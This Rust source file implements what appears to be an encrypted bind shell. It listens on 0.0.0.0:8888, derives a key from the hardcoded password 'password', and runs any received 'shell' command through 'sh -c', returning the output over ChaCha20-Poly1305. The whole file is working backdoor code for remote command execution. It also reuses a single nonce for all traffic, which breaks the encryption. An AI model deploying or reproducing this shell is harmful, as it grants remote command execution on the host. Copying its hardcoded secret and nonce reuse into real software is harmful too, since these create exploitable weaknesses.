use chacha20poly1305::Nonce;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::process::{Command, Stdio};

mod common;

const PASSWORD: &str = "password";
const SERVER_ADDR: &str = "0.0.0.0:8888";

fn handle_client(mut stream: std::net::TcpStream) {
    let mut buffer = [0u8; 65536];
    let mut nonce = [0u8; common::NONCE_LEN];
    let key = common::derive_key(PASSWORD);

    stream.read_exact(&mut nonce).unwrap();
    let nonce = Nonce::from_slice(&nonce);

    loop {
        let n = stream.read(&mut buffer).expect("Failed to read");
        if n == 0 {
            break;
        }

        let plaintext = common::decrypt_data(&buffer[..n], &key, nonce).expect("Failed to decrypt");
        let plaintext = String::from_utf8(plaintext).expect("Failed to convert to string");
        // trunk-ignore(clippy/needless_late_init)
        let output: Vec<u8>;
        if plaintext.starts_with("shell") {
            let command = &plaintext[6..];
            let cmd_output = Command::new("sh")
                .arg("-c")
                .arg(command)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .output()
                .expect("Failed to execute command");
            output = cmd_output.stdout;
        } else {
            output = plaintext.as_bytes().to_vec();
        }

        let ciphertext = common::encrypt_data(&output, &key, nonce).expect("Failed to encrypt");
        stream.write_all(&ciphertext).expect("Failed to write");
        stream.flush().expect("Failed to flush");
    }
}

fn main() {
    let listener = TcpListener::bind(SERVER_ADDR).expect("Failed to bind");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(move || handle_client(stream));
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }
}
